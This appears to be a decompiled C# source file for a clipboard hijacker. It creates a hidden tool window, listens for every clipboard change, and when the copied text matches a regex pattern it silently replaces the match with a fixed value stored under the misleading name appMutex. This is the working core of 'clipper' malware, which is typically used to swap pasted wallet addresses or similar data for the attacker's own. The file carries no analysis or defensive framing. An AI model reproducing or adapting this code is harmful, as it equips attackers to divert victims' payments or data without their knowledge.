using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace ConsoleApplication7;

public sealed class ClipboardNotification
{
	public class NotificationForm : Form
	{
		private static string currentClipboard = Clipboard.GetText();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).get_CreateParams();
				createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
				return createParams;
			}
		}

		public NotificationForm()
		{
			Program.NativeMethods.SetParent(((Control)this).get_Handle(), Program.NativeMethods.intpreclp);
			Program.NativeMethods.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		private bool RegexResult(Regex pattern)
		{
			if (pattern.Match(currentClipboard).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == 797)
			{
				currentClipboard = Clipboard.GetText();
				if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex))
				{
					string text = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex);
					Clipboard.SetText(text);
				}
			}
			((Form)this).WndProc(ref m);
		}
	}
}
